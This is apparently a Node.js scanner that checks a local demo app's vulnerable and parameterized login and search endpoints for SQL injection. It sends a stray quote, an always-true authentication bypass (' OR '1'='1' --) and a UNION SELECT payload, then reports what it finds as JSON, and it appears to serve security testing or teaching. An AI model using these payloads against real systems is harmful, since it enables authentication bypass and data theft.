const http = require('node:http');

const args = process.argv.slice(2);
const targetIdx = args.indexOf('--target');
const target = targetIdx !== -1 ? args[targetIdx + 1] : 'http://localhost:3000';

function request(urlStr) {
  return new Promise((resolve, reject) => {
    const req = http.get(urlStr, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          resolve({ status: res.statusCode, body: JSON.parse(data) });
        } catch {
          resolve({ status: res.statusCode, body: null, raw: data });
        }
      });
    });
    req.on('error', reject);
    req.setTimeout(5000, () => { req.destroy(); reject(new Error('timeout')); });
  });
}

// Tests a login endpoint for error-based SQLi and authentication bypass.
async function testLogin(path, label) {
  const findings = [];

  // Error-based: unbalanced quote forces a SQL syntax error
  const errPayload = "'";
  try {
    const res = await request(
      `${target}${path}?username=${encodeURIComponent(errPayload)}&password=test`
    );
    if (res.status === 500 && res.body?.error) {
      const msg = res.body.error.toLowerCase();
      if (msg.includes('sql') || msg.includes('sqlite') || msg.includes('syntax') || msg.includes('unrecognized')) {
        findings.push({
          endpoint: label,
          vulnerability_type: 'Error-Based SQLi',
          payload: errPayload,
          evidence: `SQL error leaked in response: "${res.body.error}"`,
          severity: 'HIGH',
        });
      }
    }
  } catch (_) { /* server unreachable — skip */ }

  // Authentication bypass: always-true condition short-circuits the password check
  const bypassPayload = "' OR '1'='1' --";
  try {
    const res = await request(
      `${target}${path}?username=${encodeURIComponent(bypassPayload)}&password=wrong`
    );
    if (res.status === 200 && res.body?.authenticated === true) {
      findings.push({
        endpoint: label,
        vulnerability_type: 'Authentication Bypass',
        payload: bypassPayload,
        evidence: 'Login succeeded with always-true SQL injection; password was never checked',
        severity: 'CRITICAL',
      });
    }
  } catch (_) { /* server unreachable — skip */ }

  return findings;
}

// Tests a search endpoint for error-based and UNION-based SQLi.
async function testSearch(path, label) {
  const findings = [];

  // Baseline: a search term guaranteed to return 0 results
  let baselineCount = 0;
  try {
    const res = await request(`${target}${path}?q=safe_input_xyz_no_match`);
    baselineCount = res.body?.results?.length ?? 0;
  } catch (_) { /* ignore */ }

  // Error-based
  const errPayload = "'";
  try {
    const res = await request(
      `${target}${path}?q=${encodeURIComponent(errPayload)}`
    );
    if (res.status === 500 && res.body?.error) {
      const msg = res.body.error.toLowerCase();
      if (msg.includes('sql') || msg.includes('sqlite') || msg.includes('syntax') || msg.includes('unrecognized')) {
        findings.push({
          endpoint: label,
          vulnerability_type: 'Error-Based SQLi',
          payload: errPayload,
          evidence: `SQL error leaked in response: "${res.body.error}"`,
          severity: 'HIGH',
        });
      }
    }
  } catch (_) { /* server unreachable — skip */ }

  // UNION-based: appends a synthetic row; detectable by an expanded result set
  // Products table has 4 columns (id, name, description, price)
  const unionPayload = "' UNION SELECT 1,2,3,4 --";
  try {
    const res = await request(
      `${target}${path}?q=${encodeURIComponent(unionPayload)}`
    );
    const rowCount = res.body?.results?.length ?? 0;
    if (res.status === 200 && rowCount > baselineCount) {
      findings.push({
        endpoint: label,
        vulnerability_type: 'Union-Based SQLi',
        payload: unionPayload,
        evidence: `Result set grew from ${baselineCount} to ${rowCount} rows — UNION injection exfiltrated extra data`,
        severity: 'HIGH',
      });
    }
  } catch (_) { /* server unreachable — skip */ }

  return findings;
}

async function main() {
  const startTime = Date.now();

  const [vulnLoginFindings, safeLoginFindings, vulnSearchFindings, safeSearchFindings] =
    await Promise.all([
      testLogin('/login',       'GET /login (vulnerable)'),
      testLogin('/login/safe',  'GET /login/safe (parameterized)'),
      testSearch('/search',     'GET /search (vulnerable)'),
      testSearch('/search/safe','GET /search/safe (parameterized)'),
    ]);

  const findings = [
    ...vulnLoginFindings,
    ...safeLoginFindings,
    ...vulnSearchFindings,
    ...safeSearchFindings,
  ];

  const result = {
    target,
    scan_duration_ms: Date.now() - startTime,
    endpoints_tested: 4,
    findings,
    summary: {
      total_findings: findings.length,
      critical: findings.filter((f) => f.severity === 'CRITICAL').length,
      high:     findings.filter((f) => f.severity === 'HIGH').length,
      safe_endpoints_confirmed: [safeLoginFindings, safeSearchFindings].filter((a) => a.length === 0).length,
    },
  };

  // Machine-readable output on stdout only — tests parse this
  process.stdout.write(JSON.stringify(result, null, 2) + '\n');

  // Human-readable summary on stderr
  process.stderr.write('\n--- SQL Injection Scan Results ---\n');
  process.stderr.write(`Target:   ${target}\n`);
  process.stderr.write(`Duration: ${result.scan_duration_ms}ms\n`);
  process.stderr.write(`Findings: ${findings.length}\n`);
  findings.forEach((f) => {
    process.stderr.write(`  [${f.severity}] ${f.endpoint}: ${f.vulnerability_type}\n`);
    process.stderr.write(`           ${f.evidence}\n`);
  });
  process.stderr.write(`Safe endpoints confirmed clean: ${result.summary.safe_endpoints_confirmed}/2\n`);
}

main().catch((err) => {
  process.stdout.write(JSON.stringify({ target, error: err.message, findings: [], summary: { total_findings: 0 } }, null, 2) + '\n');
  process.exit(1);
});
